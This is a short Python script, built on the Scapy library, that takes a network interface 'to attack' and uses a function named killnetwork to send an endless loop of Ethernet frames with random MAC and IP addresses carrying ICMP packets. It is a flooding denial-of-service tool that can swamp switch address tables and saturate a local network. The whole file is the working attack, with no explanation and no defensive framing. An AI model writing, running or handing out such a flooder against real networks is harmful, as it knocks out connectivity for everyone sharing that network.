#!/usr/bin/env python3

#Import Scapy
from scapy.all import *
from scapy.contrib.icmp_extensions import *
import argparse


def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-i", dest="interface", type=str, required=True, help="Chose the interface to attack")
    args = parser.parse_args()

    return args


def killnetwork(interface):
    death_packet = Ether(src=RandMAC(), dst=RandMAC())
    death_packet /= IP(src=RandIP(), dst=RandIP())
    death_packet /= ICMP()
    sendp(death_packet, iface=args.interface, loop=1, verbose=1)


args = get_arguments()
killnetwork(args.interface)
